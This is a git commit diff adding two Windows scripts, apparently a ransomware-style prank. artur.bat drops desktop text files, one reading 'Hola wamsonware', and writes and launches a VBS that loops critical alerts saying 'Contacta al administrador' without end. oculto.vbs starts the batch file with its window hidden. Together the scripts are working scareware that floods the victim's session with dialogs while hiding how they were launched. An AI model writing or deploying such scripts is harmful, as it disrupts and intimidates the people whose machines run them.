71b64b26b5f4c864f55a4992918996272521dd7e
Mago6 <los.renglones.torcidos.de.dios.666@gmail.com>
2025-04-09 22:51:19 -0600

    Add files via upload

---
+++ artur.bat
@@ -0,0 +1,22 @@
+@echo off
+:: Esperar 3 segundos
+ping 127.0.0.1 -n 6 > nul
+
+:: Crear archivo VBS en temp (ruta segura) para el mensaje repetitivo
+set rutaContador=%TEMP%\contactar.vbs
+:: Crear el archivo hola.txt con el texto "Hola Mundo"
+echo Hola admin > %USERPROFILE%\Desktop\hola.txt
+echo Hola wamsonware > %USERPROFILE%\Desktop\hola2.txt
+echo Hola Mddundo > %USERPROFILE%\Desktop\hola3.txt
+
+
+:: Crear el archivo VBS con un mensaje repetitivo
+echo Do >> "%rutaContador%"
+echo MsgBox "Contacta al administrador.", vbCritical + vbOKOnly, "¡Alerta!" >> "%rutaContador%"
+echo Loop >> "%rutaContador%"
+
+:: Ejecutar el VBS con WScript (modo ventana)
+start wscript.exe "%rutaContador%"
+
+pause
+exit
---
+++ oculto.vbs
@@ -0,0 +1,2 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "%TEMP%\artur.bat", 0, False
